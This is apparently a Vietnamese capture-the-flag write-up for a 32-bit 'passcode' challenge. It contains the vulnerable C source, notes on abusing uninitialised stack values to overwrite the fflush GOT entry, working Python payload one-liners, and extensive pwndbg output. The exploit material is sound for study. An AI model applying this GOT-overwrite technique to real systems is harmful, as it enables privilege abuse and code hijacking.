```
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

1. tìm địa chỉ của biến passcode1 và passcode2? tìm cái này kiểu gì nhỉ, hay mặc định là 2 biến local này sẽ được lưu ở đầu stack frame?
- passcode1 và passcode2 là biến local nên sẽ nằm trên stack nhưng không nhất thiết phải ở đầu stack.

2. chèn giá trị của 2 biến này thông qua name[100]
- vì khi cấp phát stack frame cho 1 hàm, những chỗ không sử dụng sẽ là undef và không ai xóa nó đi cả, tận dụng chỗ này để ghi chèn giá trị của passcode1 và passcode2.

3. giá trị chèn không phải là 123456 và 13371337 vì dùng `scanf("%d", passcode1)`, vì nếu passcode1 = 123456 thì lệnh scanf sẽ ghi một giá trị bất kì vào địa chỉ 0x123456, và địa chỉ 0x123456 thường không hợp lệ hoặc không có quyền ghi nên nó sẽ bị segmentation fault.

4. để chèn được thì đầu tiên tôi sẽ fill toàn bộ name[100] bằng kí tự A

4. giá trị chèn passcode1 sẽ là địa chỉ của lệnh `fflush`; giá trị nhập khi chạy chương trình ./passscode là địa chỉ của lệnh `system("/bin/cat flag");`, do đó khi lệnh này được thực hiện, nó sẽ ghi địa chỉ của dòng lệnh in flag vào chỗ địa chỉ của lệnh fflush. Sau đó tại lệnh sau (lệnh fflush), nó sẽ tìm địa chỉ của lệnh fflush để thực hiện, lúc này địa chỉ của fflush đã được thay rồi nên thực tế nó sẽ thực hiện lệnh in flag.

Bảng GOT (global offset table) là bảng tra cứu địa chỉ, khi biên dịch thì compiler không biết địa chỉ của hàm ở đâu trong RAM do cơ chế ASLR, thay vì sửa lại toàn bộ mã máy mỗi khi chạy thì compiler tạo ra một bảng GOT, lần đầu tiên hàm được gọi, hệ thống sẽ tìm địa chỉ thật và điền vào bảng GOT. 
Địa chỉ của bảng GOT nằm trong .data

sử dụng pipe input để đếm giá trị cho tiện `pwndbg> run <<< $(python3 -c "print('A'*96 + '\x14\xc0\x04\x08' + '\n' + '134517437\n')")` (chỉ sử dụng đc trong pwngdb)

(python3 -c "import sys; sys.stdout.buffer.write(b'A'*96 + b'\x14\xc0\x04\x08' + b'\n' + b'134517437\n')"; cat) | ./passcode

(python3 -c "import sys; sys.stdout.buffer.write(b'A'*96 + b'\x14\xc0\x04\x08' + b'\n' + b'134517358\n')"; cat) | ./passcode

(python3 -c "import sys; sys.stdout.buffer.write(b'A'*96 + b'\x14\xc0\x04\x08' + b'\n' + b'134517409\n')"; cat) | ./passcode


<<< là redirect input nên toàn bộ chuỗi sẽ được chuyển qua stdin, sau khi scanf cho name xong là ngốn sách dữ liệu, không còn cho login nữa.

địa chỉ của flush trong GOT 0x0804c014
lấy địa chỉ từ hàm nạp đầu vào vào thanh ghi, nếu không nó sẽ vẫn nhận đầu vào là lệnh rỗng bất kỳ
0x080492bd
134517437

5. sử dụng lệnh đọc giá trị của esp (vì đề bài gợi ý là 32bit nên không cần xem rsp) để xem biến A sẽ được fill từ đâu đến đâu 


```
pwndbg> run <<< $(python3 -c "print('A'*96 + '\x14\xc0\x04\x08')")
Starting program: /home/passcode/passcode <<< $(python3 -c "print('A'*96 + '\x14\xc0\x04\x08')")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.

Breakpoint 1, 0x080492f6 in welcome ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0x28
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 ECX  0xf7f869b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7fdab80 (_rtld_global_ro) ◂— 0
 ESI  0xffd5a5b4 —▸ 0xffd5bd67 ◂— '/home/passcode/passcode'
 EBP  0xffd5a4d8 —▸ 0xffd5a4e8 —▸ 0xf7fdb020 (_rtld_global) —▸ 0xf7fdba40 ◂— 0
 ESP  0xffd5a4d4 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 EIP  0x80492f6 (welcome+4) ◂— sub esp, 0x74
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x80492f6 <welcome+4>     sub    esp, 0x74     ESP => 0xffd5a4d4 - 0x74
   0x80492f9 <welcome+7>     call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>
 
   0x80492fe <welcome+12>    add    ebx, 0x2d02
   0x8049304 <welcome+18>    mov    eax, dword ptr gs:[0x14]       EAX, [0xf7f9d514]
   0x804930a <welcome+24>    mov    dword ptr [ebp - 0xc], eax
   0x804930d <welcome+27>    xor    eax, eax                       EAX => 0
   0x804930f <welcome+29>    sub    esp, 0xc
   0x8049312 <welcome+32>    lea    eax, [ebx - 0x1f9d]
   0x8049318 <welcome+38>    push   eax
   0x8049319 <welcome+39>    call   printf@plt                  <printf@plt>
 
   0x804931e <welcome+44>    add    esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffd5a4d4 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
01:0004│ ebp 0xffd5a4d8 —▸ 0xffd5a4e8 —▸ 0xf7fdb020 (_rtld_global) —▸ 0xf7fdba40 ◂— 0
02:0008│+004 0xffd5a4dc —▸ 0x8049395 (main+49) ◂— call login
03:000c│+008 0xffd5a4e0 —▸ 0xffd5a500 ◂— 1
04:0010│+00c 0xffd5a4e4 —▸ 0xf7f85000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
05:0014│+010 0xffd5a4e8 —▸ 0xf7fdb020 (_rtld_global) —▸ 0xf7fdba40 ◂— 0
06:0018│+014 0xffd5a4ec —▸ 0xf7d7c519 (__libc_start_call_main+121) ◂— add esp, 0x10
07:001c│+018 0xffd5a4f0 —▸ 0xffd5bd67 ◂— '/home/passcode/passcode'
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x80492f6 welcome+4
   1 0x8049395 main+49
   2 0xf7d7c519 __libc_start_call_main+121
   3 0xf7d7c5f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/40wx $esp-0x70
0xffd5a464:     0x08aba1a0      0x00000028      0x00000001      0x00000000
0xffd5a474:     0x00000028      0xf7dda49d      0xf7f83a60      0xf7f85da0
0xffd5a484:     0xf7f85000      0xffd5a4c8      0xf7dce42b      0xf7f85da0
0xffd5a494:     0x0000000a      0x00000027      0xffd5a618      0x00000000
0xffd5a4a4:     0x000007d4      0xf7f85e3c      0x00000027      0xffd5a4e8
0xffd5a4b4:     0xf7fb7004      0xffd5a520      0x0804c000      0xffd5a5b4
0xffd5a4c4:     0xf7fdab80      0xffd5a4e8      0x0804938d      0x0804a088
0xffd5a4d4:     0x0804c000      0xffd5a4e8      0x08049395      0xffd5a500
0xffd5a4e4:     0xf7f85000      0xf7fdb020      0xf7d7c519      0xffd5bd67
0xffd5a4f4:     0x00000070      0xf7fdb000      0xf7d7c519      0x00000001
pwndbg> x/40wx $ebp-0x70
0xffd5a468:     0x00000028      0x00000001      0x00000000      0x00000028
0xffd5a478:     0xf7dda49d      0xf7f83a60      0xf7f85da0      0xf7f85000
0xffd5a488:     0xffd5a4c8      0xf7dce42b      0xf7f85da0      0x0000000a
0xffd5a498:     0x00000027      0xffd5a618      0x00000000      0x000007d4
0xffd5a4a8:     0xf7f85e3c      0x00000027      0xffd5a4e8      0xf7fb7004
0xffd5a4b8:     0xffd5a520      0x0804c000      0xffd5a5b4      0xf7fdab80
0xffd5a4c8:     0xffd5a4e8      0x0804938d      0x0804a088      0x0804c000
0xffd5a4d8:     0xffd5a4e8      0x08049395      0xffd5a500      0xf7f85000
0xffd5a4e8:     0xf7fdb020      0xf7d7c519      0xffd5bd67      0x00000070
0xffd5a4f8:     0xf7fdb000      0xf7d7c519      0x00000001      0xffd5a5b4
pwndbg> info break
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x080492f6 <welcome+4>
        breakpoint already hit 1 time
pwndbg> dis 1
pwndbg> info break
Num     Type           Disp Enb Address    What
1       breakpoint     keep n   0x080492f6 <welcome+4>
        breakpoint already hit 1 time
pwndbg> break login
Breakpoint 2 at 0x80491fb (2 locations)
pwndbg> run <<< $(python3 -c "print('A'*96 + '\x14\xc0\x04\x08')")
Starting program: /home/passcode/passcode <<< $(python3 -c "print('A'*96 + '\x14\xc0\x04\x08')")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÀ!

Breakpoint 2, 0x080491fb in login ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 ECX  0
 EDX  0
 EDI  0xf7effb80 (_rtld_global_ro) ◂— 0
 ESI  0xffd70764 —▸ 0xffd71d67 ◂— '/home/passcode/passcode'
 EBP  0xffd70688 —▸ 0xffd70698 —▸ 0xf7f00020 (_rtld_global) —▸ 0xf7f00a40 ◂— 0
 ESP  0xffd70680 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 EIP  0x80491fb (login+5) ◂— sub esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x80491fb <login+5>     sub    esp, 0x10     ESP => 0xffd70680 - 0x10
   0x80491fe <login+8>     call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>
 
   0x8049203 <login+13>    add    ebx, 0x2dfd
   0x8049209 <login+19>    sub    esp, 0xc
   0x804920c <login+22>    lea    eax, [ebx - 0x1ff8]
   0x8049212 <login+28>    push   eax
   0x8049213 <login+29>    call   printf@plt                  <printf@plt>
 
   0x8049218 <login+34>    add    esp, 0x10
   0x804921b <login+37>    sub    esp, 8
   0x804921e <login+40>    push   dword ptr [ebp - 0x10]
   0x8049221 <login+43>    lea    eax, [ebx - 0x1fe5]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffd70680 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
01:0004│-004 0xffd70684 —▸ 0xffd70764 —▸ 0xffd71d67 ◂— '/home/passcode/passcode'
02:0008│ ebp 0xffd70688 —▸ 0xffd70698 —▸ 0xf7f00020 (_rtld_global) —▸ 0xf7f00a40 ◂— 0
03:000c│+004 0xffd7068c —▸ 0x804939a (main+54) ◂— sub esp, 0xc
04:0010│+008 0xffd70690 —▸ 0xffd706b0 ◂— 1
05:0014│+00c 0xffd70694 —▸ 0xf7eaa000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
06:0018│+010 0xffd70698 —▸ 0xf7f00020 (_rtld_global) —▸ 0xf7f00a40 ◂— 0
07:001c│+014 0xffd7069c —▸ 0xf7ca1519 (__libc_start_call_main+121) ◂— add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x80491fb login+5
   1 0x804939a main+54
   2 0xf7ca1519 __libc_start_call_main+121
   3 0xf7ca15f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/40wx $ebp-0x70
0xffd70618:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70628:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70638:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70648:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70658:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70668:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70678:     0x0480c314      0x156b4500      0x0804c000      0xffd70764
0xffd70688:     0xffd70698      0x0804939a      0xffd706b0      0xf7eaa000
0xffd70698:     0xf7f00020      0xf7ca1519      0xffd71d67      0x00000070
0xffd706a8:     0xf7f00000      0xf7ca1519      0x00000001      0xffd70764
pwndbg> x/40wx $esp-0x70
0xffd70610:     0xf7eaada0      0x099ca1a0      0x41414141      0x41414141
0xffd70620:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70630:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70640:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70650:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70660:     0x41414141      0x41414141      0x41414141      0x41414141
0xffd70670:     0x41414141      0x41414141      0x0480c314      0x156b4500
0xffd70680:     0x0804c000      0xffd70764      0xffd70698      0x0804939a
0xffd70690:     0xffd706b0      0xf7eaa000      0xf7f00020      0xf7ca1519
0xffd706a0:     0xffd71d67      0x00000070      0xf7f00000      0xf7ca1519
pwndbg> info register
eax            0x0                 0
ecx            0x0                 0
edx            0x0                 0
ebx            0x804c000           134529024
esp            0xffd70680          0xffd70680
ebp            0xffd70688          0xffd70688
esi            0xffd70764          -2685084
edi            0xf7effb80          -135267456
eip            0x80491fb           0x80491fb <login+5>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0
pwndbg> disassemble login
Dump of assembler code for function login:
   0x080491f6 <+0>:     push   ebp
   0x080491f7 <+1>:     mov    ebp,esp
   0x080491f9 <+3>:     push   esi
   0x080491fa <+4>:     push   ebx
=> 0x080491fb <+5>:     sub    esp,0x10
   0x080491fe <+8>:     call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049203 <+13>:    add    ebx,0x2dfd
   0x08049209 <+19>:    sub    esp,0xc
   0x0804920c <+22>:    lea    eax,[ebx-0x1ff8]
   0x08049212 <+28>:    push   eax
   0x08049213 <+29>:    call   0x8049050 <printf@plt>
   0x08049218 <+34>:    add    esp,0x10
   0x0804921b <+37>:    sub    esp,0x8
   0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:    lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:    push   eax
   0x08049228 <+50>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:    add    esp,0x10
   0x08049230 <+58>:    mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:    mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:    sub    esp,0xc
   0x0804923b <+69>:    push   eax
   0x0804923c <+70>:    call   0x8049060 <fflush@plt>
   0x08049241 <+75>:    add    esp,0x10
   0x08049244 <+78>:    sub    esp,0xc
   0x08049247 <+81>:    lea    eax,[ebx-0x1fe2]
   0x0804924d <+87>:    push   eax
   0x0804924e <+88>:    call   0x8049050 <printf@plt>
   0x08049253 <+93>:    add    esp,0x10
   0x08049256 <+96>:    sub    esp,0x8
   0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:   lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:   push   eax
   0x08049263 <+109>:   call   0x80490d0 <__isoc99_scanf@plt>
   0x08049268 <+114>:   add    esp,0x10
   0x0804926b <+117>:   sub    esp,0xc
   0x0804926e <+120>:   lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:   push   eax
   0x08049275 <+127>:   call   0x8049090 <puts@plt>
   0x0804927a <+132>:   add    esp,0x10
   0x0804927d <+135>:   cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:   jne    0x80492ce <login+216>
   0x08049286 <+144>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:   jne    0x80492ce <login+216>
   0x0804928f <+153>:   sub    esp,0xc
   0x08049292 <+156>:   lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>:   push   eax
   0x08049299 <+163>:   call   0x8049090 <puts@plt>
   0x0804929e <+168>:   add    esp,0x10
   0x080492a1 <+171>:   call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:   mov    esi,eax
   0x080492a8 <+178>:   call   0x8049080 <getegid@plt>
   0x080492ad <+183>:   sub    esp,0x8
   0x080492b0 <+186>:   push   esi
   0x080492b1 <+187>:   push   eax
   0x080492b2 <+188>:   call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:   add    esp,0x10
   0x080492ba <+196>:   sub    esp,0xc
   0x080492bd <+199>:   lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:   push   eax
   0x080492c4 <+206>:   call   0x80490a0 <system@plt>
   0x080492c9 <+211>:   add    esp,0x10
   0x080492cc <+214>:   jmp    0x80492ea <login+244>
   0x080492ce <+216>:   sub    esp,0xc
   0x080492d1 <+219>:   lea    eax,[ebx-0x1fab]
   0x080492d7 <+225>:   push   eax
   0x080492d8 <+226>:   call   0x8049090 <puts@plt>
   0x080492dd <+231>:   add    esp,0x10
   0x080492e0 <+234>:   sub    esp,0xc
   0x080492e3 <+237>:   push   0x0
   0x080492e5 <+239>:   call   0x80490b0 <exit@plt>
   0x080492ea <+244>:   nop
   0x080492eb <+245>:   lea    esp,[ebp-0x8]
   0x080492ee <+248>:   pop    ebx
   0x080492ef <+249>:   pop    esi
   0x080492f0 <+250>:   pop    ebp
   0x080492f1 <+251>:   ret    
End of assembler dump.
pwndbg> break *0x08049228
Breakpoint 3 at 0x8049228
pwndbg> c
Continuing.

Breakpoint 3, 0x08049228 in login ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x804a01b ◂— 0x65006425 /* '%d' */
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
*ECX  0xf7eaa000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 EDX  0
 EDI  0xf7effb80 (_rtld_global_ro) ◂— 0
 ESI  0xffd70764 —▸ 0xffd71d67 ◂— '/home/passcode/passcode'
 EBP  0xffd70688 —▸ 0xffd70698 —▸ 0xf7f00020 (_rtld_global) —▸ 0xf7f00a40 ◂— 0
*ESP  0xffd70660 —▸ 0x804a01b ◂— 0x65006425 /* '%d' */
*EIP  0x8049228 (login+50) ◂— call __isoc99_scanf@plt
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x8049228 <login+50>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
        format: 0x804a01b ◂— 0x65006425 /* '%d' */
        vararg: 0x480c314
 
   0x804922d <login+55>    add    esp, 0x10
   0x8049230 <login+58>    mov    eax, dword ptr [ebx - 4]
   0x8049236 <login+64>    mov    eax, dword ptr [eax]
   0x8049238 <login+66>    sub    esp, 0xc
   0x804923b <login+69>    push   eax
   0x804923c <login+70>    call   fflush@plt                  <fflush@plt>
 
   0x8049241 <login+75>    add    esp, 0x10
   0x8049244 <login+78>    sub    esp, 0xc
   0x8049247 <login+81>    lea    eax, [ebx - 0x1fe2]
   0x804924d <login+87>    push   eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffd70660 —▸ 0x804a01b ◂— 0x65006425 /* '%d' */
01:0004│-024 0xffd70664 ◂— 0x480c314
02:0008│-020 0xffd70668 ◂— 0x41414141 ('AAAA')
03:000c│-01c 0xffd7066c —▸ 0x8049203 (login+13) ◂— add ebx, 0x2dfd
04:0010│-018 0xffd70670 ◂— 0x41414141 ('AAAA')
05:0014│-014 0xffd70674 ◂— 0x41414141 ('AAAA')
06:0018│-010 0xffd70678 ◂— 0x480c314
07:001c│-00c 0xffd7067c ◂— 0x156b4500
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x8049228 login+50
   1 0x804939a main+54
   2 0xf7ca1519 __libc_start_call_main+121
   3 0xf7ca15f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/2wx $esp
0xffd70660:     0x0804a01b      0x0480c314
pwndbg> q
warning: Could not rename /home/passcode/.gdb_history-gdb113403~ to /home/passcode/.gdb_history: No such file or directory
passcode@ubuntu:~$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*96 + b'\x14\xc0\x04\x08' + b'\n' + b'134517437\n')" | ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
/bin/cat: flag: Permission denied
enter passcode1 : Now I can safely trust you that you have credential :)
passcode@ubuntu:~$ ls
flag  passcode  passcode.c
passcode@ubuntu:~$ cd ~
passcode@ubuntu:~$ whoami
passcode
passcode@ubuntu:~$ gdb -x passcode
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
pwndbg: loaded 187 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $argv, $envp, $argc, $environ, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
passcode:1: Error in sourced command file:
Undefined command: "".  Try "help".
------- tip of the day (disable with set show-tips off) -------
Use the context (or ctx) command to display the context once again. You can reconfigure the context layout with set context-section <sections> or forward the output to a file/tty via set context-output <file>. See also config context to configure it further!
pwndbg> file passcode
Reading symbols from passcode...
(No debugging symbols found in passcode)
pwndbg> disassemble login
Dump of assembler code for function login:
   0x080491f6 <+0>:     push   ebp
   0x080491f7 <+1>:     mov    ebp,esp
   0x080491f9 <+3>:     push   esi
   0x080491fa <+4>:     push   ebx
   0x080491fb <+5>:     sub    esp,0x10
   0x080491fe <+8>:     call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049203 <+13>:    add    ebx,0x2dfd
   0x08049209 <+19>:    sub    esp,0xc
   0x0804920c <+22>:    lea    eax,[ebx-0x1ff8]
   0x08049212 <+28>:    push   eax
   0x08049213 <+29>:    call   0x8049050 <printf@plt>
   0x08049218 <+34>:    add    esp,0x10
   0x0804921b <+37>:    sub    esp,0x8
   0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:    lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:    push   eax
   0x08049228 <+50>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:    add    esp,0x10
   0x08049230 <+58>:    mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:    mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:    sub    esp,0xc
   0x0804923b <+69>:    push   eax
   0x0804923c <+70>:    call   0x8049060 <fflush@plt>
   0x08049241 <+75>:    add    esp,0x10
   0x08049244 <+78>:    sub    esp,0xc
   0x08049247 <+81>:    lea    eax,[ebx-0x1fe2]
   0x0804924d <+87>:    push   eax
   0x0804924e <+88>:    call   0x8049050 <printf@plt>
   0x08049253 <+93>:    add    esp,0x10
   0x08049256 <+96>:    sub    esp,0x8
   0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:   lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:   push   eax
   0x08049263 <+109>:   call   0x80490d0 <__isoc99_scanf@plt>
   0x08049268 <+114>:   add    esp,0x10
   0x0804926b <+117>:   sub    esp,0xc
   0x0804926e <+120>:   lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:   push   eax
   0x08049275 <+127>:   call   0x8049090 <puts@plt>
   0x0804927a <+132>:   add    esp,0x10
   0x0804927d <+135>:   cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:   jne    0x80492ce <login+216>
   0x08049286 <+144>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:   jne    0x80492ce <login+216>
   0x0804928f <+153>:   sub    esp,0xc
   0x08049292 <+156>:   lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>:   push   eax
   0x08049299 <+163>:   call   0x8049090 <puts@plt>
   0x0804929e <+168>:   add    esp,0x10
   0x080492a1 <+171>:   call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:   mov    esi,eax
   0x080492a8 <+178>:   call   0x8049080 <getegid@plt>
   0x080492ad <+183>:   sub    esp,0x8
   0x080492b0 <+186>:   push   esi
   0x080492b1 <+187>:   push   eax
   0x080492b2 <+188>:   call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:   add    esp,0x10
   0x080492ba <+196>:   sub    esp,0xc
   0x080492bd <+199>:   lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:   push   eax
   0x080492c4 <+206>:   call   0x80490a0 <system@plt>
   0x080492c9 <+211>:   add    esp,0x10
   0x080492cc <+214>:   jmp    0x80492ea <login+244>
   0x080492ce <+216>:   sub    esp,0xc
   0x080492d1 <+219>:   lea    eax,[ebx-0x1fab]
   0x080492d7 <+225>:   push   eax
   0x080492d8 <+226>:   call   0x8049090 <puts@plt>
   0x080492dd <+231>:   add    esp,0x10
   0x080492e0 <+234>:   sub    esp,0xc
   0x080492e3 <+237>:   push   0x0
   0x080492e5 <+239>:   call   0x80490b0 <exit@plt>
   0x080492ea <+244>:   nop
   0x080492eb <+245>:   lea    esp,[ebp-0x8]
   0x080492ee <+248>:   pop    ebx
   0x080492ef <+249>:   pop    esi
   0x080492f0 <+250>:   pop    ebp
   0x080492f1 <+251>:   ret    
End of assembler dump.
```
